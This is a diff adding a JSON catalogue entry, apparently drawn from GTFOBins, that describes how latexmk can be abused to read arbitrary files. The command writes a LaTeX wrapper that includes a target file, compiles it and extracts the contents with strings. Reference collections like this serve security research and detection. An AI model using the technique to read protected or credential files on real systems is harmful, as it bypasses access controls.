@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-latexmk-file-read",
+  "name": "GTFOBins · latexmk (file-read)",
+  "command": "echo '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/path/to/input-file}\\end{document}' >/path/to/temp-file\nlatexmk -dvi /path/to/temp-file\nstrings temp-file.dvi",
+  "description": "Use latexmk to file read via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "latexmk",
+    "file-read"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/latexmk/#file-read",
+  "upstream_id": "latexmk/file-read/0",
+  "category": "gtfobins",
+  "subcategory": "file-read",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/latexmk/"
+    }
+  ]
+}
